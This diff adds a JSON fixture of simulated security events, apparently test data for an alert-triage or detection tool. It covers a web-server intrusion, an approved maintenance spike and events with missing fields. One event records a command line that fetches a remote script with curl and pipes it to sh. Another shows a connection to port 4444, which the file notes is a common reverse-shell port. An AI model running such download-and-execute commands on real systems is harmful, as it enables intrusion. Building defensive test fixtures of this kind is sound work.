@@ -1,0 +1,135 @@
+[
+  {
+    "event_id": "EVT-0001",
+    "asset_id": "HLT-WEB-01",
+    "timestamp": "2026-10-31T15:02:10+05:30",
+    "event_type": "http",
+    "source_sensor": "nginx-access-log",
+    "details": {
+      "scenario": "B",
+      "method": "POST",
+      "path": "/appointments/upload.php?file=../../tmp/x.php",
+      "status": 200,
+      "client_ip": "198.51.100.200",
+      "requests_last_minute": 340,
+      "baseline_requests_per_minute": 45,
+      "note": "Path traversal pattern in an upload request, 7x normal request rate"
+    },
+    "is_simulated": true
+  },
+  {
+    "event_id": "EVT-0002",
+    "asset_id": "HLT-WEB-01",
+    "timestamp": "2026-10-31T15:03:40+05:30",
+    "event_type": "process",
+    "source_sensor": "edr-agent",
+    "details": {
+      "scenario": "B",
+      "parent_process": "php-fpm8.3",
+      "child_process": "/bin/sh",
+      "command_line": "sh -c 'curl -s http://203.0.113.250/s | sh'",
+      "user": "www-data",
+      "note": "A web server worker should never spawn a shell"
+    },
+    "is_simulated": true
+  },
+  {
+    "event_id": "EVT-0003",
+    "asset_id": "HLT-WEB-01",
+    "timestamp": "2026-10-31T15:06:05+05:30",
+    "event_type": "network",
+    "source_sensor": "netflow",
+    "details": {
+      "scenario": "B",
+      "direction": "outbound",
+      "dest_ip": "203.0.113.250",
+      "dest_port": 4444,
+      "protocol": "tcp",
+      "bytes_out": 18234,
+      "first_seen_destination": true,
+      "note": "Asset has never talked to this destination; 4444 is a common reverse-shell port"
+    },
+    "is_simulated": true
+  },
+  {
+    "event_id": "EVT-0004",
+    "asset_id": "BNK-NET-01",
+    "timestamp": "2026-10-31T02:00:00+05:30",
+    "event_type": "maintenance",
+    "source_sensor": "change-management",
+    "details": {
+      "scenario": "C",
+      "change_id": "CHG-2026-1031-07",
+      "window_start": "2026-10-31T02:00:00+05:30",
+      "window_end": "2026-10-31T04:00:00+05:30",
+      "description": "Monthly patching + cache warm-up load test",
+      "approved_by": "bank-change-board"
+    },
+    "is_simulated": true
+  },
+  {
+    "event_id": "EVT-0005",
+    "asset_id": "BNK-NET-01",
+    "timestamp": "2026-10-31T02:20:00+05:30",
+    "event_type": "http",
+    "source_sensor": "nginx-access-log",
+    "details": {
+      "scenario": "C",
+      "requests_last_minute": 2100,
+      "baseline_requests_per_minute": 300,
+      "http_4xx_ratio": 0.01,
+      "client_ip": "10.20.9.15",
+      "client_label": "internal load-test runner",
+      "note": "7x spike but from an internal host during an approved window"
+    },
+    "is_simulated": true
+  },
+  {
+    "event_id": "EVT-0006",
+    "asset_id": "BNK-NET-01",
+    "timestamp": "2026-10-31T02:35:00+05:30",
+    "event_type": "process",
+    "source_sensor": "edr-agent",
+    "details": {
+      "scenario": "C",
+      "parent_process": "systemd",
+      "child_process": "/usr/bin/apt-get",
+      "command_line": "apt-get -y upgrade",
+      "user": "root",
+      "note": "Expected package upgrade during maintenance"
+    },
+    "is_simulated": true
+  },
+  {
+    "event_id": "EVT-0007",
+    "asset_id": "WTR-WEB-01",
+    "timestamp": "2026-10-31T16:10:00+05:30",
+    "event_type": "auth",
+    "source_sensor": "web-app-log",
+    "details": {
+      "scenario": "incomplete",
+      "failed_logins_last_minute": 55,
+      "username": "admin",
+      "client_ip": null,
+      "note": "Burst of failed logins but the proxy stripped the client IP - source unknown"
+    },
+    "is_simulated": true
+  },
+  {
+    "event_id": "EVT-0008",
+    "asset_id": null,
+    "timestamp": "2026-10-31T16:12:30+05:30",
+    "event_type": "network",
+    "source_sensor": "perimeter-ids",
+    "details": {
+      "scenario": "incomplete",
+      "direction": "inbound",
+      "src_ip": "198.51.100.201",
+      "dest_ip": null,
+      "dest_port": 443,
+      "signature": "possible credential stuffing",
+      "note": "Sensor did not record which internal host was targeted (asset_id unknown)"
+    },
+    "is_simulated": true
+  }
+]
